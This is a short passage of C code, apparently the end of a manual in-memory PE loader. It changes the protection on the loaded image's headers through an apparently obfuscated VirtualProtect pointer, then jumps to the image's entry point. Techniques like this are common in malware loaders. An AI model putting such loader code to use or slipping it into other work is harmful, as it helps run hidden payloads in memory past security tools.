        pVP(img, hdSz, 0x02, &hdOld);

        ULONG_PTR ep = (ULONG_PTR)img + epRVA;
        ((void(*)())ep)();
    }

    return 0;
}
